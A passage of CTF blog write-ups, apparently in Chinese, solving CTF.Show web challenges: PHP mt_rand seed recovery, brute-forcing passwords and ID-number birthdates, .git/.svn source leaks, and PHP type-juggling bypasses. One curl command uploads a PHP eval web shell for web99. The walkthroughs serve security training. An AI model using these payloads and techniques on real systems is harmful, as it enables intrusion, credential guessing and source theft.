<h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>mt_rand 的伪随机数</li>
</ul>
<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p>参考资料：<a href="https://blog.csdn.net/crisprx/article/details/104306971">https://blog.csdn.net/crisprx/article/details/104306971</a></p>
<p>将代码复制下来，并将mt_rand 赋值给一个变量，断点调试观察到，无论刷新几次，该值都不会变化，实际上该值仅与 mt_rand() 被调用的次数有关，我们把断点调试拿到的这个值 1155388967 作为参数 r 拿到flag。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%203.png" alt="Untitled"></p>
<h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>; <span class="comment">// 此处可获得 rand 的相反数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>首先输入r=0获取其第一个mt_rand的值的相反数，比如我们此处获得 -769757407 ，然后将r的值设为769757407，返回空白页即进入下一步。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%204.png" alt="Untitled"></p>
<p>可以考虑从随机数反推种子，参考资料<a href="https://blog.csdn.net/weixin_30271335/article/details/95240888">https://blog.csdn.net/weixin_30271335/article/details/95240888</a></p>
<p>我们可以利用 php-mt-seed 来反推。执行下面命令，可以得到以下结果（由于ctfshow超时了，导致重新分配了一个种子）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php-mt-seed <span class="number">227011223</span></span><br><span class="line"></span><br><span class="line">Pattern: EXACT</span><br><span class="line">Version: <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span></span><br><span class="line">Found <span class="number">0</span>, trying <span class="number">0x84000000</span> - <span class="number">0x87ffffff</span>, speed <span class="number">4814.3</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x84d77ec4</span> = <span class="number">2228715204</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">seed = <span class="number">0x84d77ec5</span> = <span class="number">2228715205</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">Found <span class="number">2</span>, trying <span class="number">0xc0000000</span> - <span class="number">0xc3ffffff</span>, speed <span class="number">4880.6</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0xc13ba64a</span> = <span class="number">3241911882</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">seed = <span class="number">0xc13ba64b</span> = <span class="number">3241911883</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">Found <span class="number">4</span>, trying <span class="number">0xfc000000</span> - <span class="number">0xffffffff</span>, speed <span class="number">4916.1</span> Mseeds/s</span><br><span class="line">Version: <span class="number">5.2</span>.<span class="number">1</span>+</span><br><span class="line">Found <span class="number">4</span>, trying <span class="number">0x2a000000</span> - <span class="number">0x2bffffff</span>, speed <span class="number">44.5</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x2b444473</span> = <span class="number">725894259</span> (PHP <span class="number">7.1</span>.<span class="number">0</span>+)</span><br><span class="line">Found <span class="number">5</span>, trying <span class="number">0x38000000</span> - <span class="number">0x39ffffff</span>, speed <span class="number">44.4</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x381e00cb</span> = <span class="number">941490379</span> (PHP <span class="number">7.1</span>.<span class="number">0</span>+)</span><br><span class="line">Found <span class="number">6</span>, trying <span class="number">0xfe000000</span> - <span class="number">0xffffffff</span>, speed <span class="number">42.3</span> Mseeds/s</span><br><span class="line">Found <span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>由题目，我们的版本为7.3.11，可以看一下Found5和Found6，我们再来简单写一下php试试结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="number">725894259</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;r=&quot;</span> . mt_rand() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;token=&quot;</span> . (mt_rand() + mt_rand());</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// r=227011223</span></span><br><span class="line"><span class="comment">// token=1651918006</span></span><br></pre></td></tr></table></figure>

<p>很幸运，第一个就是正确的，我们成功拿到flag。</p>
<h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>这一题，很显然让我们爆破数据库的密码。有了上一次的经验，这次爆破他没给字典我也用他的字典了 -.-</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%205.png" alt="Untitled"></p>
<p>填写好example的信息，我们应该选择爆破的是数据库的密码，那就给密码加上payload，其他按照示例填写，并导入字典文件。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%206.png" alt="Untitled"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%207.png" alt="Untitled"></p>
<p>最后查看 Length 不同的一项，7758521 为密码，拿到flag。</p>
<h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>我们可以从网站底部获取一份录取名单，内容如下</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%208.png" alt="Untitled"></p>
<p>并且我们可以进入学生学籍信息查询系统，只需要爆破姓名和身份证号码。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%209.png" alt="Untitled"></p>
<p>我们以第一个为例。由于身份证这几位由年、月、日组成，实际上我们也不用从0爆破到99999999，只需要按照规律设置好就可以。比如说，我们可以将 Payload type 设置为 Dates，同时将格式 format 设置为 <code>yyyyMMdd</code> ，并将日期设置为从1995到2005。当然如果你有条件，你也可以在本地计算好符合校验码的身份证再提交，我这里就不折腾了，如下图</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2010.png" alt="Untitled"></p>
<p>然后我就将第一个从65年查到了05年，终于找到了他的生日 19900201 ，并且在弹窗中找到了他的学号和密码。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2011.png" alt="Untitled"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2012.png" alt="Untitled"></p>
<h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>我原本以为他是按照 0/1/2/3.txt 这样的顺序迭代下去的，然后发现它延长了 N 倍而且死循环了，我还以为等就好了，等了小几分钟发现原来是卡bug了（</p>
<p>看 Hint，发现原来是爆破前面两个目录，也不难理解 -.- 把 2.txt 去掉以后就是403错误页面，一般来说403错误就证明了存在这个目录，我们只需要爆破路径 {0-100}/{0-100} 即可，最终获得路径 72/20</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2013.png" alt="Untitled"></p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 信息收集 (Web补充)</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-collect-info-Extension.html</url>
    <content><![CDATA[<blockquote>
<p>此文章为 Klee-CTF 专题</p>
</blockquote>
<h1 id="Web7-Plus"><a href="#Web7-Plus" class="headerlink" title="Web7-Plus"></a>Web7-Plus</h1><p>地址是：<a href="https://gitleak.tari.moe/">https://gitleak.tari.moe/</a>，首先用<a href="https://github.com/maurosoria/dirsearch#Installation--Usage">dirsearch</a>跑一下测试，结果如下</p>
<span id="more"></span>

<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled.png"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%201.png"></p>
<p>但是在这里，只拿到了一个index.html，感觉怪怪的</p>
<p>用 <a href="https://github.com/WangYihang/GitHacker">GitHacker</a> 重新试一下， <code>githacker --url [https://gitleak.tari.moe/.git/](https://gitleak.tari.moe/.git/) --folder result</code></p>
<p>拉下来文件以后，git log发现这里有个commit，然后使用 git diff 8d15 来查看修改内容</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%202.png"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%203.png"></p>
<p><code>flag&#123;761b8a9b-4250-4ac5-89c6-657c36f23dba&#125;</code></p>
<h1 id="web8-plus"><a href="#web8-plus" class="headerlink" title="web8-plus"></a>web8-plus</h1><p>dirscan 获取泄露路径</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%204.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%204.png"></p>
<p><code>python3 [SvnExploit.py](http://svnexploit.py/) -u [https://svnleak.tari.moe/.svn](https://svnleak.tari.moe/.svn) --dump</code></p>
<p>获取源码</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%205.png"></p>
<p>查看config.php获取flag</p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 PHP 特性 1 web89~web99</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html</url>
    <content><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><code>PHP Version: 7.4.2</code></p>
<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>请求参数可为数组</li>
</ul>
<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>我们将它的代码复制下来再修改一下，好好折磨折磨</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;fake_flag&#123;xxxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        print_r(<span class="variable">$num</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled.png" alt="Untitled"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%201.png" alt="Untitled"></p>
<p>如果随便输入一个单词，那么判断条件 intval 将会为 0；但如果在单词中夹入数字，会被preg_match过滤。</p>
<p>但事实上，$_GET 里面这个 num 参数是可控的，它不仅仅可以是 int 或者 string， 还可以是 array。当 $num 为 array 时， preg_match 将无法发挥作用，并且 intval 在传入参数为数组时始终返回 1。通过下面代码进行测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&quot;m2222&quot;</span> =&gt; <span class="string">&quot;a1111&quot;</span>, <span class="string">&quot;m223322&quot;</span> =&gt; <span class="string">&quot;a1111&quot;</span>)); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>所以，只要传入参数中 key 为数组，具体实现方式为变量后面添加 [] ，就可以绕过正则判断，同时还能使 intval 始终为 1。得以拿到flag。</p>
<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><ul>
<li>利用进制不同来绕开强类型判断</li>
<li>利用 intval 去掉小数点获得flag</li>
<li>利用 %00 截断参数</li>
<li>在数字后面添加任意字母拿到的都是数字</li>
<li>利用字符隔断某整数之后的数字</li>
</ul>
<h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>我特意去翻了翻 intval 相关的参数代表着什么（<a href="https://www.runoob.com/php/php-intval-function.html">https://www.runoob.com/php/php-intval-function.html</a>），发现其中一句话写的就是</p>
<blockquote>
<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p>
</blockquote>
<p>好家伙，送分。</p>
<p>这题n个思路m个答案，</p>
<ul>
<li>十六进制的4476为 <code>0x117c</code> ，直接写入请求参数即可。（适用于 web92）</li>
<li>另一种是8进制，写入<code>010574</code>。（适用于 web92, web93）</li>
<li>还有一种是利用它整数性质，intval会将小数点去掉，参数写入 <code>4476.*</code> 即可获得flag。（适用于 web92, web93）</li>
<li>还有一种方法是在4476后面加入 <code>%00</code> ，成功绕过强类型判断</li>
<li>还有一种方法是在4476后面加乱七八糟的东西，应该和上一个原理差不多，比如<code>4476你爱我，我爱你，蜜雪冰城甜蜜蜜</code></li>
<li>对于 web94 ，第三个条件为判断0的位置，如果不存在0或者存在0放在第一个都会die，那就加一个符号将它隔断，比如 <code>4476;0</code></li>
</ul>
<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个判断最大的区别就是一个是 /im ， 一个是/i。我特地去查了一下这两个究竟有啥区别</p>
<blockquote>
<p>i modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z])<br>m modifier: multi line. Causes ^ and $ to match the begin/end of each line (not only begin/end of string)</p>
</blockquote>
<p>于是我在自己环境尝试替换了一下变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$a=$_GET[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;php\nphp&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>结果不进下一个变量了。究其原因关键可能还在于这个 ^和$，也就导致它一行字符串只能出现 php，而 /im 允许出现多行， /i 只能在一行上出现，php\nphp满足了两行字符串均为php，而无法满足在一个字符串内全为php的条件。当然，这个$a可不能直接当参数，还得 urlencode 一下，最后结果为 <code>php%0Aphp</code></p>
<h1 id="web92-web94"><a href="#web92-web94" class="headerlink" title="web92~web94"></a>web92~web94</h1><p>见 web90</p>
<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><code>PHP Version: 7.3.11</code></p>
<p>兼容 web90, web92~web94, web95</p>
<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p>这题中第一个判断条件使用了弱类型判断，隔绝了在4476后面加任意字符串的做法。</p>
<p>同时在第二个判断条件使用了小数点和字母判断，隔绝了使用小数或者十六进制的做法。</p>
<p>在第三个判断条件引入了判断0的位置，看似隔绝了八进制的做法，因为八进制的0是在第一个的，也就是位置为0，判断时0是false。</p>
<p>但是，我没想到八进制的0还可以不在第0位，只要在前面加个+或者空格就行。</p>
<p>使用  <code>010574</code> 或者<code>+010574</code> 即可获得flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><code>PHP Version: All</code></p>
<h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><ul>
<li>绝对路径绕过</li>
</ul>
<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%202.png" alt="Untitled"></p>
<p>随便输点东西可以获得其绝对路径 <code>/var/www/html</code>，然后将参数替换为 <code>/var/www/html/flag.php</code>即可获得flag。</p>
<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><code>PHP Version: All</code></p>
<h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><ul>
<li>简单的 md5 碰撞</li>
</ul>
<h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>参考资料：<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p>
<p>因为判断条件中等于号为强类型判断，所以原有的 a:QNKCDZO b:s878926199a 就不好用了。</p>
<p>但是利用上面的，请求参数是可以放一个数组的，我们尝试一下放一个数组会怎样，我们写一个简单的 PHP 程序来测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%203.png" alt="Untitled"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%204.png" alt="Untitled"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP Warning: md5() expects parameter <span class="number">1</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /Users/kelly/Documents/Program/PHP/CTFShow/web97.php on line <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>经过简单调试后，我们发现 md5() 一个数组的话，会抛出异常，同时赋值的变量也会变为<code>null</code>。再看其中一个判断条件，<code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code> </p>
<p>巧了吗不是，<code>null==null</code>，所以我们只需要在a参数和b参数上分别填上两个数组即可拿到flag。</p>
<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p><code>PHP Version: All</code></p>
<h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><ul>
<li>指针</li>
</ul>
<h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>我们来分析一下这个代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 21:39:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先看highlight_file 这个最关键的，这个 $flag 应该就是从 flag.php 中拿出来的 flag，所以关键的就是要修改 $_GET[‘HTTP_FLAG’] 的值，来让它引入 $flag 从而产生报错。</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>改POST为GET。我们可以看到，第一行中的 $_GET 就足以产生影响。所以我们可以先构造 POST 的参数为 HTTP_FLAG，再随便写一个 GET 参数，这样就可以看到报错信息拿到flag了。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%205.png" alt="Untitled"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>先将参数改POST为GET，再改为COOKIE。</p>
<p>由于第一步有一个置换 $_GET 的过程，也就是说你想修改 $_GET 变量就必定会执行 <code>$_GET?$_GET=&amp;_POST:&#39;flag&#39;;</code>，所以要使下一行<code>$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;</code>生效，POST的参数就必须有 flag:flag ，同时 <code>$_COOKIE[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;</code></p>
<p>最后curl请求为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://09063fa0-4302-4c56-aa44-ce9b71e4eb40.challenge.ctf.show:8080/?flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: HTTP_FLAG=flag&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;flag=&quot;flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>套娃，先将参数改POST为GET，再改为COOKIE，再改Header。</p>
<p>前两步和之前一样，cookie改为 flag=flag，同时再在请求头加入 flag=flag，最后curl请求为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://09063fa0-4302-4c56-aa44-ce9b71e4eb40.challenge.ctf.show:8080/?flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;flag: flag&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;flag=&quot;flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><p><code>PHP Version: All</code></p>
<h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>说实话，我真没搞懂这个要干啥，因为尝试了一下 233.php 加一句话木马就可以了。。。</p>
<p>然后我丢到 phpstorm 调试了一下，哦感情这是抽卡呢…</p>
<p>其实主要是因为这个for循环的范围太广了， <code>$i=36; $i &lt; 0x36d; $i++</code> 一共可以插800多个，运气好可以插到小数点和php的ascii码。不行就多试几次</p>
<p>参数如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://2da731a5-dc75-499b-ae8f-ac7202e78130.challenge.ctf.show:8080/?n=233.php&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;content=&quot;&lt;?php eval($_POST[0]); ?&gt;&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后丢到 AntSword 里面看一下，里面有个 flag36d.php，打开就能拿到flag。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%206.png" alt="Untitled"></p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 信息收集</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-collect-info.html</url>
    <content><![CDATA[<blockquote>
<p>此文章为 Klee-CTF 专题</p>
</blockquote>
<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><span id="more"></span>

<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled.png"></p>
<p>右键查看源代码，发现flag</p>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>右键无法查看源代码，但你可以在地址栏添加 view-source:</p>
